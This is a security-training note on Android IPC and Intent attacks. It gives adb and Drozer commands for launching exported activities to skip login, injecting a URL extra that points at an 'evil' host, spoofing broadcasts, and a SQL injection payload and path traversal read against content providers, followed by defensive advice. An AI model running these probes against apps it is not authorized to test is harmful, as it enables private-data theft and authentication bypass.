---
tags: [mobile, android, ipc, intents, pentesting]
difficulty: advanced
module: "50 - Mobile Application Security"
topic: "50.09 Android IPC and Intent Attacks"
---

# Android IPC and Intent Attacks

## Introduction
Android's component model (Activities, Services, Broadcast Receivers, Content Providers — see [[02 - Android Fundamentals and Attack Surface]]) communicates via **Intents** and is the platform's richest local attack surface. When a component is **exported**, *any other app* (including a malicious one the victim installs) can invoke it. Vulnerabilities arise when exported components perform privileged actions, trust Intent data they shouldn't, leak data, or expose providers to SQL injection and path traversal. This note covers the major IPC attack classes and how to probe them, including with **Drozer**.

## Exported Components = Entry Points
A component is reachable cross-app when `android:exported="true"` (or implicitly, via an intent-filter on old target SDKs). Enumerate them:
```bash
# from the manifest (apktool/jadx) — list exported components
grep -E 'activity|service|receiver|provider' AndroidManifest.xml | grep -i export
# Drozer — interactive IPC attack toolkit
drozer console connect
run app.package.attacksurface com.target.app          # exported components
run app.activity.info -a com.target.app
```

## Attack Classes
### 1. Activity launching & intent injection
Exported Activities can be launched directly, skipping the screens (and auth) that normally precede them:
```bash
adb shell am start -n com.target.app/.SecretActivity   # bypass login UI?
adb shell am start -n com.target.app/.WebActivity -e url "https://evil"  # injected extra
drozer> run app.activity.start --component com.target.app .SecretActivity
```
If the Activity trusts an Intent **extra** (e.g. loads a URL into a WebView, reads a file path, trusts an "isAdmin" boolean), you control it → WebView abuse ([[11 - WebView Attacks]]), redirection, or privilege bypass.

### 2. Broadcast Receiver abuse
Exported receivers act on broadcasts any app can send — spoof the event to trigger privileged behaviour, or read **sticky/ordered** broadcasts to intercept data.
```bash
adb shell am broadcast -a com.target.ACTION_DO_THING --es token "x"
```

### 3. Service abuse
Exported Services can be started/bound by other apps and made to perform their exposed operations (e.g. an "export data" or "exec command" service).

### 4. Content Provider attacks (high value)
Exported `ContentProvider`s expose data via `content://` URIs:
```bash
# read data the provider exposes
drozer> run app.provider.query content://com.target.app.provider/users
adb shell content query --uri content://com.target.app.provider/users
# SQL injection in selection / projection
drozer> run app.provider.query content://.../users --selection "1=1) UNION SELECT ..."
# path traversal in a file-backed provider -> read arbitrary files
drozer> run app.provider.read content://.../file/../../../databases/app.db
```
Providers are a frequent source of **data leakage, SQLi, and path traversal** when they don't restrict access or sanitize URIs.

### 5. Pending Intent & implicit-Intent hijacking
A **mutable PendingIntent** handed to another component can be filled in by an attacker to redirect a privileged action. **Implicit Intents** broadcasting sensitive data can be intercepted by any matching app. **Deep links** (custom schemes/App Links) are Intent entry points — see also [[10 - iOS URL Schemes Deeplinks and Universal Links]] for the iOS analogue.

### 6. Task hijacking (StrandHogg-class)
By declaring `taskAffinity`/`allowTaskReparenting`, a malicious app can insert its Activity into the target's task stack so its phishing UI appears as the target app — credential theft via UI spoofing.

```text
+---------------------------------------------------------------+
|              ANDROID IPC ATTACK MAP                          |
+---------------------------------------------------------------+
|  exported Activity  -> launch direct / inject extras          |
|  exported Receiver  -> spoof broadcast / sniff                |
|  exported Service   -> invoke privileged op                   |
|  exported Provider  -> data leak / SQLi / path traversal      |
|  mutable PendingIntent -> redirect privileged action          |
|  implicit Intent    -> interception by malicious app          |
|  taskAffinity       -> task hijacking / UI spoof              |
+---------------------------------------------------------------+
```

## Why It Matters
IPC flaws let a *malicious app with no special permissions* (or even adb access) reach functionality the developer assumed was internal — bypassing auth screens, reading private data via providers, injecting URLs into WebViews, or spoofing the UI. They're high-impact and extremely common, and Drozer makes them fast to find.

## Defensive Notes
- Set `exported="false"` for everything not intentionally public; on Android 12+ explicit `exported` is mandatory — default deny.
- Protect necessary public components with **`signature`-level custom permissions**; **validate every Intent extra** (never trust paths, URLs, flags from Intents).
- Content Providers: enforce permissions, use parameterized queries, canonicalize file paths, restrict `grantUriPermissions`.
- Use **immutable** PendingIntents; avoid sending sensitive data in implicit broadcasts; set `taskAffinity=""` / `FLAG_ACTIVITY_NEW_TASK` hygiene to resist task hijacking.

## Related Notes
- [[02 - Android Fundamentals and Attack Surface]]
- [[11 - WebView Attacks]]
- [[10 - iOS URL Schemes Deeplinks and Universal Links]]
- [[17 - UI Redress Tapjacking Overlays and Pasteboard Leakage]]
